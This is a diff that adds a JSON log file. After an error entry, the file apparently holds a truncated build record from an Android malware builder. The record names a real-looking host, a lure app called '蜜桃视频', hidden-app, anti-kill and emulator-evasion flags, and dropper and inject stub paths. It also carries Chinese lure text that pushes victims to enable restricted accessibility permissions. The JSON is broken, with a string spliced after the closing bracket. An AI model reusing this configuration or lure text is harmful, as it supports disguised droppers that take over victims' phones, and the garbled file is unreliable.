@@ -1,0 +1,8 @@
+[
+  {
+    "Date": "04/01/2026 16:48:58",
+    "Content": ">InsertApp Error 2: Response status code does not indicate success: 404 (Not Found)."
+  }
+]ier.verdictor.archiver\r\nUserid: 139119\r\nClientName: 蜜桃视频\r\nEmail: ob502xy14cf1UlFr0ALK7JCZGmSjC+pl6+77BfZ5ETCEoUOtNsdZllIJFWLv8NIO\r\nMainActivity: empty\r\nAppdir: empty\r\nUserHost: yk.6668888.top\r\nuse_access: 1\r\nuse_antkill: 1\r\nuse_atoprims: 加载中~请勿操作或锁屏！\r\nnotifytitle:   \r\nnotifymsg: off\r\nASKPRIM_all: 1\r\nASKPRIM_black: 1\r\nBuildtype: C\r\nappname: 蜜桃视频\r\nappversion: 7.8.1\r\nappicopath: 6b97b5f9d875b0c0b3bc5cfcb35a4e02.png\r\nappurl: CPoRthd0IL3UxgQwdBNKvA==\r\nlogintitle: name\r\nlogindis: 允许受限制的设置\r\nloginbtn: 确定\r\nlngshort: 蜜桃视频温馨提醒\n因大陆网络受限制本次需要开启权限才能使用\n请仔细阅读使用步骤--\n1、点击下方确定--\n2、打开已下载服务（或应用）--\n3、点击蜜桃视频--开始使用--等待加载100%即可使用\r\nhiddenapp: 1\r\nnoemulator: /www/wwwroot/yk.6668888.top/user/ui/6b97b5f9d875b0c0b3bc5cfcb35a4e02.png\r\ninstalltype: g\r\nhidetype: f\r\nuse_draw: 0\r\nopen_access：0\r\ndescr_iption：无\r\ndiao_type：1\r\nZIPPATH: /www/wwwroot/yk.6668888.top/private/apkstub/apkstub.zip\r\nTargetApkicon: /www/wwwroot/yk.6668888.top/user/storage/139119/icons/6b97b5f9d875b0c0b3bc5cfcb35a4e02.png\r\nDropStub: /www/wwwroot/yk.6668888.top/private/apkstub/dropstub.zip\r\nInjectStub: /www/wwwroot/yk.6668888.top/private/apkstub/jectstub.zip\r\nuserfolder: /www/wwwroot/yk.6668888.top/user/apps/139119/com.notifier.verdictor.archiver"
+  }
+]
